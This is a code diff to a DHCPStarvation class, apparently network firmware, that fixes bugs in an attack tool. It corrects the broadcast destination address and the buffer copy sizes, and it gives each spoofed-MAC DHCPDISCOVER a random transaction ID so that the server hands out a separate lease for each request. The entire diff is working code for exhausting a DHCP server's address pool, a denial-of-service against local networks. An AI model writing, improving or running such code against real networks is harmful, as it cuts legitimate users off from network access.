@@ -82,7 +82,7 @@ void DHCPStarvation::prepare_udp_ipv4_hdr() {
     ipv4_pkt._ttl = 0x10;   // TTL: 16
     ipv4_pkt._proto = 0x11; // Protocol: 17(UDP)
 
-    memcpy(&ipv4_pkt.dest.addr, broadcast_mac_address, 4);
+    ipv4_pkt.dest.addr = 0xFFFFFFFF; // 255.255.255.255 broadcast
 
     uint8_t src_ip[4] = {0, 0, 0, 0};
     memcpy(&ipv4_pkt.src.addr, src_ip, 4);
@@ -157,10 +157,10 @@ void DHCPStarvation::setup() {
     prepare_dhcp_hdr();
 
     //  UDP Header
-    memcpy(ethernet_frame + ETH_HDRLEN + IP_HLEN, &udp_payload, DHCP_HDRLEN + UDP_HLEN);
+    memcpy(ethernet_frame + ETH_HDRLEN + IP_HLEN, &udp_payload, UDP_HLEN);
 
-    // Fill payload
-    memcpy(ethernet_frame + ETH_HDRLEN + IP_HLEN + UDP_HLEN, &dhcp_payload, UDP_HLEN);
+    // Fill DHCP payload
+    memcpy(ethernet_frame + ETH_HDRLEN + IP_HLEN + UDP_HLEN, &dhcp_payload, sizeof(dhcp_msg));
 
     ethernet_frame[285] = 0xff; // Close the packet
 }
@@ -170,6 +170,11 @@ void DHCPStarvation::send_DHCP_packet() {
     uint8_t *ethernet_frame = (uint8_t *)p->payload;
     randomize_mac();
     change_mac_in_packet();
+
+    // Each DHCPDISCOVER needs a unique transaction ID so the server
+    // treats them as independent lease requests
+    uint32_t xid = random();
+    memcpy(ethernet_frame + ETH_HDRLEN + IP_HLEN + UDP_HLEN + 4, &xid, 4);
 
     // Send packet
     netif->linkoutput(netif, p);
